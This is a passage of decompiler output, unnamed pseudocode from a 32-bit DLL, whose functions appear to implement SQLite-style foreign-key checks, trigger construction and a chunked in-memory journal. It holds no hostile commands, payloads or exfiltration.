            if ( sub_100593BE(*(unsigned __int8 **)(*(_DWORD *)(i + 44) + 4 * j), v15) )
              break;
            v17 = *(unsigned __int8 **)v14;
            v16 = 0;
            v19 = (unsigned __int8 **)(a4 + 40);
            while ( sub_100593BE(*v19, v17) )
            {
              v19 += 2;
              if ( ++v16 >= v6 )
                goto LABEL_31;
            }
            if ( v20 )
              *(_DWORD *)(v20 + 4 * j) = *(_DWORD *)(a4 + 8 * v16 + 36);
LABEL_31:
            if ( v16 == v6 )
              break;
          }
          if ( j == v6 )
            goto LABEL_19;
        }
        else if ( *(_BYTE *)(i + 25) == 2 )
        {
          if ( v20 )
          {
            v12 = 0;
            if ( v6 > 0 )
            {
              v13 = (_DWORD *)(a4 + 36);
              do
              {
                *(_DWORD *)(v20 + 4 * v12++) = *v13;
                v13 += 2;
              }
              while ( v12 < v6 );
            }
          }
LABEL_19:
          *a5 = i;
          return 0;
        }
      }
    }
    if ( !*(_BYTE *)(a2 + 442) )
      sub_10059320((int *)a2, aForeignKeyMism);
    sub_10058EC7(*(_DWORD *)a2, v20);
    return 1;
  }
  v8 = a3[2];
  if ( v8 < 0 || v7 && sub_100593BE(*(unsigned __int8 **)(24 * v8 + a3[4]), v7) )
    goto LABEL_10;
  return 0;
}

//----- (10080B22) --------------------------------------------------------
int __cdecl sub_10080B22(int *a1, int a2, int a3, _DWORD *a4, int a5, _DWORD *a6, int a7, int a8)
{
  int *v8; // ebx
  int v9; // eax
  int v10; // edi
  int v11; // esi
  int v12; // eax
  int v13; // edi
  int v14; // ecx
  int i; // esi
  int v16; // esi
  unsigned __int16 *v17; // eax
  int v18; // eax
  char v19; // cl
  unsigned __int16 *Srca; // [esp+Ch] [ebp-14h]
  void *Src; // [esp+Ch] [ebp-14h]
  int v23; // [esp+10h] [ebp-10h]
  int v24; // [esp+10h] [ebp-10h]
  int v25; // [esp+14h] [ebp-Ch]
  int v26; // [esp+18h] [ebp-8h]
  int v27; // [esp+1Ch] [ebp-4h]
  int v28; // [esp+38h] [ebp+18h]

  v8 = sub_1007C271(a1);
  v26 = a1[17] - 1;
  v9 = sub_1005AC63((int)v8);
  v10 = a5;
  v11 = 0;
  v27 = v9;
  if ( a8 < 0 )
    sub_1005ABE8((int)v8, 110, *(unsigned __int8 *)(a5 + 24), v9);
  if ( *(int *)(a5 + 20) > 0 )
  {
    do
      sub_1005ABE8((int)v8, 73, a6[v11++] + a7 + 1, v27);
    while ( v11 < *(_DWORD *)(a5 + 20) );
  }
  if ( a4 )
  {
    v13 = *(_DWORD *)(a5 + 20);
    v24 = sub_10078AA4(a1, v13);
    v25 = sub_10078A55(v14);
    Srca = (unsigned __int16 *)sub_1006CBB6(a1, a4);
    sub_1005AB66((int)v8, 38, v26, a4[5], a2);
    sub_1005AFA8(-1, v8, Srca, (_BYTE *)0xFFFFFFF0);
    for ( i = 0; i < v13; ++i )
      sub_1005ABE8((int)v8, 15, a6[i] + a7 + 1, i + v24);
    if ( a3 == *(_DWORD *)a5 && a8 == 1 )
    {
      v16 = 0;
      for ( Src = (void *)(v8[3] + v13 + 1); v16 < v13; ++v16 )
        sub_1005AB66((int)v8, 75, a6[v16] + a7 + 1, (int)Src, *(_DWORD *)(a4[2] + 4 * v16) + a7 + 1);
      sub_1005ABE8((int)v8, 1, 0, v27);
    }
    sub_1005AB66((int)v8, 30, v24, v13, v25);
    v17 = (unsigned __int16 *)sub_10079249(v8, a4);
    sub_1005AFA8(-1, v8, v17, 0);
    sub_1005AC32(v8, 49, v26, v27, v25, 0);
    v18 = sub_10078A70((int)a1, v25);
    v12 = sub_10078AC8(v18, v24, v13);
    v10 = a5;
  }
  else
  {
    v28 = sub_10078A55((int)a1);
    sub_1005ABE8((int)v8, 15, *a6 + a7 + 1, v28);
    v23 = sub_1005ABE8((int)v8, 21, v28, 0);
    if ( a3 == *(_DWORD *)v10 && a8 == 1 )
      sub_1005AB66((int)v8, 76, a7, v27, v28);
    sub_100791F0(a3, a1, v26, a2, 38);
    sub_1005AB66((int)v8, 51, v26, 0, v28);
    sub_1005ABE8((int)v8, 1, 0, v27);
    sub_1005AE20(v8[3] - 2, (int)v8);
    sub_1005AE20(v23, (int)v8);
    v12 = sub_10078A70((int)a1, v28);
  }
  v19 = *(_BYTE *)(v10 + 24);
  if ( v19 || *(_DWORD *)(v12 + 424) || *(_BYTE *)(v12 + 344) )
  {
    if ( a8 > 0 && !v19 )
    {
      if ( *(_DWORD *)(v12 + 424) )
        v12 = *(_DWORD *)(v12 + 424);
      *(_BYTE *)(v12 + 345) = 1;
    }
    sub_1005ABE8((int)v8, 109, *(unsigned __int8 *)(v10 + 24), a8);
  }
  else
  {
    sub_1006CB81((int *)v12, 2, (unsigned __int16 *)aForeignKeyCons_0, (_BYTE *)0xFFFFFFFE);
  }
  sub_1005ACAF((int)v8, v27);
  return sub_1005ABD1((int)v8, 42, v26);
}
// 10080C59: variable 'v14' is possibly undefined

//----- (10080DEF) --------------------------------------------------------
int __usercall sub_10080DEF@<eax>(int *a1@<eax>, int a2, int a3, int a4, int a5, int a6, int a7, int a8)
{
  int v8; // ebx
  _DWORD *v9; // eax
  _DWORD *v10; // edi
  bool v11; // cc
  _DWORD *v12; // esi
  int v13; // eax
  _DWORD *v14; // eax
  _DWORD *v15; // eax
  _DWORD *v16; // esi
  _DWORD *v17; // eax
  unsigned int v18; // edi
  int v19; // eax
  _DWORD *v20; // eax
  _DWORD *v21; // esi
  int result; // eax
  int v23[9]; // [esp+Ch] [ebp-38h] BYREF
  _DWORD *v24; // [esp+30h] [ebp-14h]
  int v25; // [esp+34h] [ebp-10h]
  int v26; // [esp+38h] [ebp-Ch]
  int v27; // [esp+3Ch] [ebp-8h]
  unsigned __int8 *v28; // [esp+40h] [ebp-4h]

  v8 = (int)a1;
  v27 = *a1;
  v28 = 0;
  v25 = 0;
  v9 = sub_1007C271(a1);
  v10 = (_DWORD *)a5;
  v24 = v9;
  if ( a8 < 0 )
    v25 = sub_1005ABE8((int)v9, 110, *(unsigned __int8 *)(a5 + 24), 0);
  v11 = *(_DWORD *)(a5 + 20) <= 0;
  v26 = 0;
  if ( !v11 )
  {
    do
    {
      v12 = sub_10075D3B(v27, 132);
      if ( v12 )
      {
        if ( a4 )
        {
          v13 = *(_DWORD *)(*(_DWORD *)(a4 + 16) + 16) + 24 * *(_DWORD *)(*(_DWORD *)(a4 + 8) + 4 * v26);
          v12[6] = *(_DWORD *)(*(_DWORD *)(a4 + 8) + 4 * v26) + a7 + 1;
          *((_BYTE *)v12 + 1) = *(_BYTE *)(v13 + 22);
          v12[5] = sub_1006AB10((int *)v8, *(char **)(v13 + 16));
        }
        else
        {
          v12[6] = a7;
          *((_BYTE *)v12 + 1) = 100;
        }
      }
      v14 = sub_10075D3B(v27, 26);
      v15 = sub_10075DC6(0, (unsigned int)v14, (int *)v8, 76, (unsigned int)v12);
      ++v26;
      v28 = (unsigned __int8 *)sub_10075DEF(v15, v27, (unsigned int)v28);
      v10 = (_DWORD *)a5;
    }
    while ( v26 < *(_DWORD *)(a5 + 20) );
  }
  if ( a3 == *v10 && a8 > 0 )
  {
    v16 = sub_10075D3B(v27, 132);
    v17 = sub_10075D3B(v27, 152);
    v18 = (unsigned int)v17;
    if ( v16 && v17 )
    {
      v16[6] = a7;
      *((_BYTE *)v16 + 1) = 100;
      v19 = *(_DWORD *)(a2 + 32);
      *(_WORD *)(v18 + 28) = -1;
      *(_DWORD *)(v18 + 24) = v19;
    }
    v20 = sub_10075DC6(0, v18, (int *)v8, 75, (unsigned int)v16);
    v28 = (unsigned __int8 *)sub_10075DEF(v20, v27, (unsigned int)v28);
  }
  memset(v23, 0, sizeof(v23));
  v23[1] = a2;
  v23[0] = v8;
  sub_1008003C((int)v28, (int)v23);
  v21 = sub_10087D63((int *)v8, (__int16 *)a2, v28, 0, 0);
  if ( a8 > 0 && !*(_BYTE *)(a5 + 24) )
  {
    if ( *(_DWORD *)(v8 + 424) )
      v8 = *(_DWORD *)(v8 + 424);
    *(_BYTE *)(v8 + 345) = 1;
  }
  sub_1005ABE8((int)v24, 109, *(unsigned __int8 *)(a5 + 24), a8);
  if ( v21 )
    sub_100883D6((unsigned int)v21);
  sub_10075FD8(v27, (unsigned int)v28);
  result = v25;
  if ( v25 )
    return sub_1005AE20(v25, (int)v24);
  return result;
}

//----- (10080FFF) --------------------------------------------------------
int *__fastcall sub_10080FFF(int a1, int a2)
{
  _BYTE *v2; // eax
  int v3; // edx
  unsigned __int8 *v4; // ecx

  v2 = sub_10059297(*(_BYTE **)(a2 + 4));
  return sub_10068FF9((int)v2, (_DWORD *)(*(_DWORD *)(v3 + 68) + 52), v4);
}
// 10081008: variable 'v3' is possibly undefined
// 1008100F: variable 'v4' is possibly undefined

//----- (10081017) --------------------------------------------------------
void __usercall sub_10081017(unsigned int a1@<ebx>, int a2)
{
  int v2; // esi

  if ( a1 )
  {
    v2 = *(_DWORD *)(a1 + 28);
    sub_10075FD8(a2, *(_DWORD *)(v2 + 20));
    sub_100767B1(*(int **)(v2 + 24), a2);
    sub_1007B016(a2, *(_DWORD *)(v2 + 8));
    sub_10075FD8(a2, *(_DWORD *)(a1 + 12));
    sub_10058EC7(a2, a1);
  }
}

//----- (1008105F) --------------------------------------------------------
_DWORD *__usercall sub_1008105F@<eax>(int a1@<eax>, __int16 *a2, int a3)
{
  _DWORD *result; // eax
  _DWORD *v5; // esi
  int v6; // ecx
  char *v7; // eax
  int v8; // [esp+10h] [ebp-8h]
  int v9; // [esp+14h] [ebp-4h]

  result = *(_DWORD **)a1;
  v8 = (int)result;
  if ( (result[3] & 0x4000000) != 0 )
  {
    result = (_DWORD *)a3;
    if ( (*(_BYTE *)(a3 + 34) & 0x10) == 0 && !*(_DWORD *)(a3 + 28) )
    {
      v9 = 0;
      v5 = sub_1007C271((int *)a1);
      if ( sub_10080FFF(v6, a3) )
        goto LABEL_10;
      result = *(_DWORD **)(a3 + 36);
      if ( result )
      {
        do
        {
          if ( *((_BYTE *)result + 24) )
            break;
          result = (_DWORD *)result[1];
        }
        while ( result );
        if ( result )
        {
          v9 = sub_1005AC63((int)v5);
          sub_1005ABE8((int)v5, 110, 1, v9);
LABEL_10:
          *(_BYTE *)(a1 + 442) = 1;
          v7 = sub_10076405(v8, a2, 0);
          sub_1008027F(a1, (int)v7, 0);
          *(_BYTE *)(a1 + 442) = 0;
          sub_1005ABE8((int)v5, 110, 0, v5[3] + 2);
          result = (_DWORD *)sub_1006CB81((int *)a1, 2, (unsigned __int16 *)aForeignKeyCons_1, (_BYTE *)0xFFFFFFFE);
          if ( v9 )
            return sub_1005ACAF((int)v5, v9);
        }
      }
    }
  }
  return result;
}
// 100810A1: variable 'v6' is possibly undefined

//----- (10081142) --------------------------------------------------------
void __cdecl sub_10081142(int *a1, _DWORD *a2, int a3, int a4)
{
  int v4; // ebx
  bool v5; // zf
  int v6; // ecx
  int v7; // eax
  _DWORD *v8; // esi
  int v9; // ecx
  int *v10; // edi
  int *v11; // eax
  int j; // eax
  int *v13; // ecx
  int *k; // esi
  __int16 *v15; // eax
  int v16; // edi
  unsigned __int8 *v17; // [esp-8h] [ebp-38h]
  int v18; // [esp-4h] [ebp-34h]
  int v19; // [esp-4h] [ebp-34h]
  int v20; // [esp-4h] [ebp-34h]
  int v21; // [esp+Ch] [ebp-24h] BYREF
  int v22; // [esp+10h] [ebp-20h]
  unsigned __int8 *i; // [esp+14h] [ebp-1Ch]
  unsigned int v24; // [esp+18h] [ebp-18h] BYREF
  int v25; // [esp+1Ch] [ebp-14h]
  _DWORD *v26; // [esp+20h] [ebp-10h] BYREF
  int *v27; // [esp+24h] [ebp-Ch] BYREF
  int *v28; // [esp+28h] [ebp-8h]
  int v29; // [esp+2Ch] [ebp-4h]

  v4 = (int)a1;
  v5 = (*(_DWORD *)(*a1 + 12) & 0x4000000) == 0;
  v6 = *((unsigned __int8 *)a1 + 442);
  v29 = *a1;
  v22 = v6;
  if ( !v5 )
  {
    sub_1007C271(a1);
    v7 = sub_1005855F(v29, a2[17]);
    v8 = (_DWORD *)a2[9];
    v9 = *(_DWORD *)(v29 + 8);
    v25 = v7;
    for ( i = *(unsigned __int8 **)(16 * v7 + v9); v8; v8 = (_DWORD *)v8[1] )
    {
      v5 = *(_BYTE *)(v4 + 442) == 0;
      v26 = 0;
      v17 = (unsigned __int8 *)v8[2];
      v24 = 0;
      if ( v5 )
      {
        v27 = sub_10069EB7(v4, 0, v17, i);
        v10 = v27;
      }
      else
      {
        v10 = sub_10069E40(v29, v17, i);
        v9 = v18;
        v27 = v10;
      }
      if ( !v10 || sub_1008099D(&v24, v4, v10, (int)v8, &v26) )
      {
        if ( !v22 || *(_BYTE *)(v29 + 30) )
          return;
      }
      else
      {
        v11 = (int *)v24;
        if ( !v24 )
        {
          v21 = v8[9];
          v11 = &v21;
        }
        v28 = v11;
        for ( j = 0; j < v8[5]; ++j )
        {
          v13 = &v28[j];
          if ( *v13 == a2[2] )
            *v13 = -1;
        }
        sub_10069AEC((int)a1, v10[6], v25, 0, v10[1]);
        ++a1[17];
        if ( a3 )
          sub_10080B22(a1, v25, (int)v27, v26, (int)v8, v28, a3, -1);
        if ( a4 )
          sub_10080B22(a1, v25, (int)v27, v26, (int)v8, v28, a4, 1);
        sub_10058EC7(v29, v24);
        v9 = v19;
        v4 = (int)a1;
      }
    }
    for ( k = sub_10080FFF(v9, (int)a2); k; k = (int *)k[3] )
    {
      v5 = *((_BYTE *)k + 24) == 0;
      v24 = 0;
      v27 = 0;
      if ( !v5 || *(_DWORD *)(v4 + 424) || *(_BYTE *)(v4 + 344) )
      {
        if ( sub_1008099D(&v27, v4, a2, (int)k, &v24) )
        {
          if ( !v22 || *(_BYTE *)(v29 + 30) )
            return;
        }
        else
        {
          v15 = sub_1006C71D(0, v29, 0, 0);
          v16 = (int)v15;
          if ( v15 )
          {
            *((_DWORD *)v15 + 5) = *k;
            *((_DWORD *)v15 + 3) = *(_DWORD *)(*k + 4);
            ++*(_WORD *)(*((_DWORD *)v15 + 5) + 32);
            *((_DWORD *)v15 + 8) = (*(_DWORD *)(v4 + 68))++;
            if ( a4 )
              sub_10080DEF((int *)v4, (int)v15, (int)a2, v24, (int)k, (int)v27, a4, -1);
            if ( a3 )
              sub_10080DEF((int *)v4, v16, (int)a2, v24, (int)k, (int)v27, a3, 1);
            v20 = v29;
            *(_DWORD *)(v16 + 12) = 0;
            sub_1006C7F7((__int16 *)v16, v20);
            v4 = (int)a1;
          }
          sub_10058EC7(v29, (unsigned int)v27);
        }
      }
    }
  }
}
// 100811BE: variable 'v18' is possibly undefined
// 10081291: variable 'v19' is possibly undefined
// 100812BD: variable 'v9' is possibly undefined

//----- (100813BF) --------------------------------------------------------
int __usercall sub_100813BF@<eax>(int a1@<ecx>, _DWORD *a2@<ebx>, int *a3)
{
  int v3; // eax
  _DWORD *i; // eax
  int *v5; // esi
  int v6; // edi
  int v7; // edx
  int *j; // esi
  int *v9; // edx
  int v10; // edi
  int v11; // eax
  int v13; // [esp+Ch] [ebp-8h] BYREF
  int v14; // [esp+10h] [ebp-4h]

  v3 = *a3;
  v14 = 0;
  if ( (*(_DWORD *)(v3 + 12) & 0x4000000) != 0 )
  {
    for ( i = (_DWORD *)a2[9]; i; i = (_DWORD *)i[1] )
    {
      a1 = i[5];
      if ( a1 > 0 )
      {
        v5 = i + 9;
        v6 = i[5];
        do
        {
          a1 = *v5;
          if ( *v5 <= 31 )
            v7 = 1 << a1;
          else
            v7 = -1;
          v14 |= v7;
          v5 += 2;
          --v6;
        }
        while ( v6 );
      }
    }
    for ( j = sub_10080FFF(a1, (int)a2); j; j = (int *)j[3] )
    {
      v13 = 0;
      sub_1008099D(0, (int)a3, a2, (int)j, &v13);
      if ( v13 && *(int *)(v13 + 4) > 0 )
      {
        v9 = *(int **)(v13 + 8);
        v10 = *(_DWORD *)(v13 + 4);
        do
        {
          if ( *v9 <= 31 )
            v11 = 1 << *v9;
          else
            v11 = -1;
          v14 |= v11;
          ++v9;
          --v10;
        }
        while ( v10 );
      }
    }
  }
  return v14;
}

//----- (1008146C) --------------------------------------------------------
int __cdecl sub_1008146C(_DWORD *a1, int a2, int a3)
{
  int v3; // ecx
  int result; // eax
  _DWORD *v5; // ebx
  _DWORD *i; // eax
  int v7; // esi
  int *v8; // edx
  int *j; // esi
  int v10; // eax
  int v11; // edi
  int v12; // ebx
  int v13; // eax
  unsigned __int8 **v14; // [esp+8h] [ebp-8h]
  int v15; // [esp+Ch] [ebp-4h]
  int v16; // [esp+Ch] [ebp-4h]

  if ( a2 )
  {
    v5 = a1;
    for ( i = (_DWORD *)a1[9]; ; i = (_DWORD *)i[1] )
    {
      if ( !i )
      {
        for ( j = sub_10080FFF(v3, (int)a1); ; j = (int *)j[3] )
        {
          if ( !j )
            return 0;
          v16 = 0;
          if ( j[5] > 0 )
            break;
LABEL_29:
          ;
        }
        v10 = v5[3];
        v14 = (unsigned __int8 **)(j + 10);
        while ( 1 )
        {
          v11 = 0;
          if ( v10 > 0 )
            break;
LABEL_28:
          ++v16;
          v14 += 2;
          if ( v16 >= j[5] )
            goto LABEL_29;
        }
        v12 = v5[4];
        while ( 1 )
        {
          v13 = *v14 ? sub_100593BE(*(unsigned __int8 **)v12, *v14) == 0 : *(unsigned __int8 *)(v12 + 21);
          if ( v13 && (*(int *)(a2 + 4 * v11) >= 0 || v11 == a1[2] && a3) )
            return 1;
          v10 = a1[3];
          ++v11;
          v12 += 24;
          if ( v11 >= v10 )
          {
            v5 = a1;
            goto LABEL_28;
          }
        }
      }
      v7 = i[5];
      v15 = 0;
      if ( v7 > 0 )
        break;
LABEL_12:
      ;
    }
    v8 = i + 9;
    while ( 1 )
    {
      v3 = *v8;
      if ( *(int *)(a2 + 4 * *v8) >= 0 || v3 == a1[2] && a3 )
        return 1;
      ++v15;
      v8 += 2;
      if ( v15 >= v7 )
        goto LABEL_12;
    }
  }
  else
  {
    result = (int)sub_10080FFF(v3, (int)a1);
    if ( result || a1[9] )
      return 1;
  }
  return result;
}
// 1008147F: variable 'v3' is possibly undefined

//----- (1008156D) --------------------------------------------------------
unsigned int __cdecl sub_1008156D(int *a1, _DWORD *a2, _DWORD *a3, int a4)
{
  BOOL v4; // eax
  int *v5; // esi
  int v6; // ebx
  _DWORD *v7; // edi
  int v8; // ecx
  unsigned int result; // eax
  int v10; // eax
  bool v11; // cc
  int v12; // ebx
  char *v13; // ecx
  int v14; // ebx
  const void *v15; // edx
  _BYTE *v16; // edx
  _DWORD *v17; // eax
  _DWORD *v18; // eax
  _DWORD *v19; // eax
  _DWORD *v20; // eax
  _DWORD *v21; // eax
  _DWORD *v22; // eax
  _DWORD *v23; // eax
  _DWORD *v24; // ebx
  _DWORD *v25; // eax
  _DWORD *v26; // eax
  void **v27; // ebx
  _BYTE *v28; // eax
  const void *v29; // ecx
  _DWORD *v30; // esi
  int *v31; // eax
  char *v32; // eax
  _DWORD *v33; // esi
  size_t v34; // ecx
  _DWORD *v35; // eax
  int *v36; // ebx
  unsigned int v37; // eax
  _DWORD *v38; // eax
  bool v39; // zf
  _DWORD *v40; // eax
  unsigned int v41; // ecx
  __int16 *v42; // [esp-20h] [ebp-80h]
  void *v43; // [esp-1Ch] [ebp-7Ch]
  int v44; // [esp-10h] [ebp-70h]
  void *v45; // [esp-8h] [ebp-68h]
  int v46; // [esp-8h] [ebp-68h]
  size_t v47; // [esp-4h] [ebp-64h]
  void *v48; // [esp-4h] [ebp-64h]
  const void *v49; // [esp+Ch] [ebp-54h] BYREF
  _BYTE *v50; // [esp+10h] [ebp-50h]
  const void *v51[2]; // [esp+14h] [ebp-4Ch] BYREF
  const void *v52[2]; // [esp+1Ch] [ebp-44h] BYREF
  const void *v53[2]; // [esp+24h] [ebp-3Ch] BYREF
  unsigned int *v54; // [esp+2Ch] [ebp-34h]
  void *Src; // [esp+30h] [ebp-30h]
  _DWORD *v56; // [esp+34h] [ebp-2Ch]
  size_t Size; // [esp+38h] [ebp-28h] BYREF
  char *v58; // [esp+3Ch] [ebp-24h]
  _DWORD *v59; // [esp+40h] [ebp-20h] BYREF
  int *v60; // [esp+44h] [ebp-1Ch]
  int v61; // [esp+48h] [ebp-18h]
  _DWORD *v62; // [esp+4Ch] [ebp-14h]
  int v63; // [esp+50h] [ebp-10h]
  void **v64; // [esp+54h] [ebp-Ch]
  void *v65; // [esp+58h] [ebp-8h]
  int v66; // [esp+5Ch] [ebp-4h]
  char v67; // [esp+73h] [ebp+13h]

  v4 = a4 != 0;
  v5 = a1;
  v6 = *a1;
  v7 = a3;
  v66 = *a1;
  v8 = *((unsigned __int8 *)a3 + v4 + 25);
  v54 = &a3[v4 + 7];
  result = *v54;
  v63 = v8;
  if ( !v8 || result )
    return result;
  Size = 0;
  v59 = 0;
  v62 = 0;
  v65 = 0;
  v60 = 0;
  v58 = 0;
  v64 = 0;
  if ( sub_1008099D(&v59, (int)a1, a2, (int)a3, &Size) )
    return 0;
  v10 = 0;
  v11 = a3[5] <= 0;
  v61 = 0;
  if ( v11 )
    goto LABEL_27;
  v52[0] = aOld_1;
  v52[1] = (const void *)3;
  v51[0] = aNew_3;
  v51[1] = (const void *)3;
  while ( 1 )
  {
    if ( v59 )
      v12 = v59[v10];
    else
      v12 = v7[9];
    if ( Size )
      v13 = *(char **)(24 * *(_DWORD *)(*(_DWORD *)(Size + 8) + 4 * v10) + a2[4]);
    else
      v13 = aOid_0;
    v14 = 24 * v12;
    v15 = *(const void **)(v14 + *(_DWORD *)(*v7 + 16));
    v53[0] = v13;
    v49 = v15;
    v53[1] = sub_10059297(v13);
    v50 = sub_10059297(v16);
    Src = sub_10075DC6(&v49, 0, v5, 26, 0);
    v56 = sub_10075DC6(v53, 0, v5, 26, 0);
    v17 = sub_10075DC6(v52, 0, v5, 26, 0);
    v5 = a1;
    v18 = sub_10075DC6(0, (unsigned int)v56, a1, 118, (unsigned int)v17);
    v19 = sub_10075DC6(0, (unsigned int)Src, a1, 76, (unsigned int)v18);
    v65 = sub_10075DEF(v19, v66, (unsigned int)v65);
    if ( a4 )
    {
      Src = sub_10075DC6(v53, 0, a1, 26, 0);
      v20 = sub_10075DC6(v51, 0, a1, 26, 0);
      v56 = sub_10075DC6(0, (unsigned int)Src, a1, 118, (unsigned int)v20);
      Src = sub_10075DC6(v53, 0, a1, 26, 0);
      v21 = sub_10075DC6(v52, 0, a1, 26, 0);
      v22 = sub_10075DC6(0, (unsigned int)Src, a1, 118, (unsigned int)v21);
      v23 = sub_10075DC6(0, (unsigned int)v56, a1, 70, (unsigned int)v22);
      v64 = (void **)sub_10075DEF(v23, v66, (unsigned int)v64);
    }
    if ( v63 != 6 )
    {
      if ( v63 == 9 )
      {
        if ( !a4 )
          goto LABEL_25;
        v24 = sub_10075DC6(v53, 0, a1, 26, 0);
        v25 = sub_10075DC6(v51, 0, a1, 26, 0);
        v26 = sub_10075DC6(0, (unsigned int)v24, a1, 118, (unsigned int)v25);
      }
      else if ( v63 == 8 && (v27 = *(void ***)(*(_DWORD *)(*a3 + 16) + v14 + 4)) != 0 )
      {
        v26 = sub_1007631C(v66, v27, 0);
      }
      else
      {
        v26 = sub_10075DC6(0, 0, a1, 98, 0);
      }
      v60 = sub_100766CA(a1, v60, (unsigned int)v26);
      sub_1007674E((char *)v60, (int)&v49, a1, 0);
      v5 = a1;
    }
LABEL_25:
    if ( ++v61 >= a3[5] )
      break;
    v10 = v61;
    v7 = a3;
  }
  v6 = v66;
  v7 = a3;
LABEL_27:
  sub_10058EC7(v6, (unsigned int)v59);
  Src = *(void **)(*v7 + 4);
  v28 = sub_10059297(Src);
  Size = (size_t)v28;
  if ( v63 == 6 )
  {
    v49 = v29;
    v50 = v28;
    v30 = sub_10075D3B(v6, 56);
    if ( v30 )
      *((_BYTE *)v30 + 1) = 2;
    v43 = v65;
    v42 = sub_1006C71D(0, v6, (int)&v49, 0);
    v31 = sub_100766CA(a1, 0, (unsigned int)v30);
    v32 = sub_1007AF57(v31, a1, (int)v42, (int)v43, 0, 0, 0, 0, 0, 0);
    v6 = v66;
    v65 = 0;
    v58 = v32;
    v28 = (_BYTE *)Size;
  }
  v67 = *(_BYTE *)(v6 + 226);
  *(_BYTE *)(v6 + 226) = 0;
  v33 = sub_1005904B(v6, (size_t)(v28 + 77));
  v59 = v33;
  if ( v33 )
  {
    v34 = Size;
    v47 = Size;
    v45 = Src;
    v33[7] = v33 + 9;
    v62 = v33 + 9;
    v33[12] = v33 + 19;
    v33[13] = v34;
    memcpy(v33 + 19, v45, v47);
    v35 = sub_1007631C(v6, (void **)v65, 1);
    v46 = v6;
    v36 = v60;
    v33[14] = v35;
    v37 = sub_10076339(v36, v46, 1);
    v44 = (int)v58;
    v33[15] = v37;
    v38 = sub_100765C5(v66, v44, 1);
    v39 = v64 == 0;
    v33[11] = v38;
    if ( !v39 )
    {
      v64 = (void **)sub_10075DC6(0, 0, a1, 19, (unsigned int)v64);
      v40 = sub_1007631C(v66, v64, 1);
      v41 = (unsigned int)v59;
      v59[3] = v40;
      v33 = (_DWORD *)v41;
    }
    v6 = v66;
  }
  v48 = v65;
  *(_BYTE *)(v6 + 226) = v67;
  sub_10075FD8(v6, (unsigned int)v48);
  sub_10075FD8(v6, (unsigned int)v64);
  sub_100767B1(v60, v6);
  sub_1007B016(v6, (unsigned int)v58);
  if ( *(_BYTE *)(v6 + 30) == 1 )
  {
    sub_10081017((unsigned int)v33, v6);
    return 0;
  }
  else
  {
    if ( v63 == 6 )
    {
      *(_BYTE *)v62 = 116;
    }
    else if ( v63 != 9 || a4 )
    {
      *(_BYTE *)v62 = 107;
    }
    else
    {
      *(_BYTE *)v62 = 106;
    }
    v62[1] = v33;
    v33[5] = a2[17];
    v33[6] = a2[17];
    *v54 = (unsigned int)v33;
    *((_BYTE *)v33 + 8) = (a4 != 0) + 106;
    return (unsigned int)v59;
  }
}
// 10081657: variable 'v16' is possibly undefined
// 10081808: variable 'v29' is possibly undefined

//----- (100819B5) --------------------------------------------------------
int *__usercall sub_100819B5@<eax>(int a1@<ecx>, int *a2@<edi>, _DWORD *a3, int a4, int a5)
{
  int *result; // eax
  int *i; // esi

  result = (int *)*a2;
  if ( (*(_DWORD *)(*a2 + 12) & 0x4000000) != 0 )
  {
    result = sub_10080FFF(a1, (int)a3);
    for ( i = result; i; i = (int *)i[3] )
    {
      result = (int *)sub_1008156D(a2, a3, i, a4);
      if ( result )
        result = (int *)sub_10073539(a2, result, a3, a5, 2, 0);
    }
  }
  return result;
}
// 10073539: using guessed type _DWORD __cdecl sub_10073539(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (10081A02) --------------------------------------------------------
void __cdecl sub_10081A02(int *a1)
{
  int *v1; // edi
  _DWORD *v2; // esi
  int v3; // eax
  int v4; // eax
  _BYTE *v5; // ecx
  _BYTE *v6; // eax
  unsigned __int8 *v7; // ecx
  int v8; // eax
  _DWORD *v9; // ebx
  int *v10; // [esp-4h] [ebp-10h]

  v1 = a1;
  v2 = (_DWORD *)a1[9];
  if ( v2 )
  {
    do
    {
      v3 = v2[4];
      if ( v3 )
      {
        *(_DWORD *)(v3 + 12) = v2[3];
      }
      else
      {
        v4 = v2[3];
        if ( v4 )
          v5 = *(_BYTE **)(v4 + 8);
        else
          v5 = (_BYTE *)v2[2];
        v10 = (int *)v2[3];
        v6 = sub_10059297(v5);
        sub_10069032((unsigned int *)(v1[17] + 52), v7, (int)v6, v10);
        v1 = a1;
      }
      v8 = v2[3];
      if ( v8 )
        *(_DWORD *)(v8 + 16) = v2[4];
      sub_10081017(v2[7], *v1);
      sub_10081017(v2[8], *v1);
      v9 = (_DWORD *)v2[1];
      sub_10058EC7(*v1, (unsigned int)v2);
      v2 = v9;
    }
    while ( v9 );
  }
}
// 10081A3F: variable 'v7' is possibly undefined

//----- (10081A84) --------------------------------------------------------
int __cdecl sub_10081A84(int a1, char *a2, int a3, __int64 a4)
{
  _DWORD *v4; // esi
  unsigned int v5; // eax
  unsigned int v6; // ecx
  __int64 v7; // rax
  bool v8; // sf
  int v9; // ecx
  size_t Size; // [esp+10h] [ebp-10h]
  int v13; // [esp+18h] [ebp-8h]
  int v14; // [esp+1Ch] [ebp-4h]

  v13 = a3;
  if ( *(_QWORD *)(a1 + 24) == a4 && a4 )
  {
    v4 = *(_DWORD **)(a1 + 32);
  }
  else
  {
    v4 = *(_DWORD **)(a1 + 4);
    v5 = 0;
    v6 = 0;
    while ( v4 )
    {
      v6 = (__PAIR64__(v6, v5) + 1020) >> 32;
      v5 += 1020;
      if ( __SPAIR64__(v6, v5) > a4 )
        break;
      v4 = (_DWORD *)*v4;
    }
  }
  v7 = a4 % 1020;
  do
  {
    v14 = 1020 - v7;
    Size = v13;
    if ( v13 >= 1020 - (int)v7 )
      Size = 1020 - v7;
    memcpy(a2, (char *)v4 + v7 + 4, Size);
    a2 += Size;
    v9 = v13 - v14;
    v8 = v13 - v14 < 0;
    v13 -= v14;
    LODWORD(v7) = 0;
    if ( v8 )
      break;
    v4 = (_DWORD *)*v4;
    if ( !v4 )
      break;
  }
  while ( v9 > 0 );
  *(_DWORD *)(a1 + 32) = v4;
  *(_QWORD *)(a1 + 24) = a4 + a3;
  return 0;
}

//----- (10081B5B) --------------------------------------------------------
int __cdecl sub_10081B5B(size_t Size, char *a2, int a3)
{
  _DWORD *v4; // ebx
  _DWORD *v5; // eax
  int Sizea; // [esp+14h] [ebp+8h]
  int v9; // [esp+18h] [ebp+Ch]

  if ( a3 <= 0 )
    return 0;
  while ( 1 )
  {
    v4 = *(_DWORD **)(Size + 16);
    v9 = *(_QWORD *)(Size + 8) % 1020i64;
    Sizea = a3;
